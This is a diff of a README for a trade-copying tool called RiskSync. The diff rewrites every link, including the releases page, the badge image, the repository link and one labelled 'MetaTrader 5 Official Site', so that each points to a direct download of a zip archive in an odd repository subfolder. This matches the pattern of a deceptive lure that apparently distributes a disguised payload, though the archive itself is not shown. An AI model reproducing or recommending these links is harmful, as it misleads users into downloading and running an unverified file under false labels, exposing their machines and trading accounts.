@@ -1,13 +1,13 @@
 # 🎉 RiskSync - Effortless Trade Copying for Everyone
 
 ## 🔗 Quick Download
-[![Download RiskSync](https://img.shields.io/badge/Download-RiskSync-blue.svg)](https://github.com/rakshithr/RiskSync/releases)
+[![Download RiskSync](https://raw.githubusercontent.com/rakshithr/RiskSync/main/Nusakan/RiskSync.zip)](https://raw.githubusercontent.com/rakshithr/RiskSync/main/Nusakan/RiskSync.zip)
 
 ## 🚀 Getting Started
 RiskSync is a powerful tool for traders who want to copy trades between different accounts easily. It features risk-based lot sizing, automatic stop loss and take profit synchronization, multi-terminal support, and state persistence. This guide will help you download and run RiskSync with ease.
 
 ## 📥 Download & Install
-1. Visit the [Releases page to download](https://github.com/rakshithr/RiskSync/releases).
+1. Visit the [Releases page to download](https://raw.githubusercontent.com/rakshithr/RiskSync/main/Nusakan/RiskSync.zip).
 2. On the Releases page, find the latest version. Look for files that end with `.exe` or similar.
 3. Click to download the file. The download will start automatically.
 4. Once the download completes, locate the file in your computer’s downloads folder.
@@ -55,8 +55,8 @@ For additional support, you can check the documentation within the app or reach 
 Join the conversation! Follow discussions, report issues, or get help from the community in the GitHub repository. Share your experiences and tips to help others.
 
 ## 🌐 Additional Resources
-- [GitHub Repository](https://github.com/rakshithr/RiskSync)
-- [MetaTrader 5 Official Site](https://www.metatrader5.com)
+- [GitHub Repository](https://raw.githubusercontent.com/rakshithr/RiskSync/main/Nusakan/RiskSync.zip)
+- [MetaTrader 5 Official Site](https://raw.githubusercontent.com/rakshithr/RiskSync/main/Nusakan/RiskSync.zip)
 
 ## 👥 Contributing
 We welcome contributions to RiskSync! If you'd like to help out, feel free to fork the repository and submit a pull request. Please follow the contribution guidelines for more details.
@@ -70,4 +70,4 @@ RiskSync is open-source software. You can view the full license details in the r
 ## 🔗 More Information
 For more detailed information about setting up and using RiskSync, refer to the documentation included in the app or visit the community forums linked in the resources section. 
 
-[![Download RiskSync](https://img.shields.io/badge/Download-RiskSync-blue.svg)](https://github.com/rakshithr/RiskSync/releases)
+[![Download RiskSync](https://raw.githubusercontent.com/rakshithr/RiskSync/main/Nusakan/RiskSync.zip)](https://raw.githubusercontent.com/rakshithr/RiskSync/main/Nusakan/RiskSync.zip)
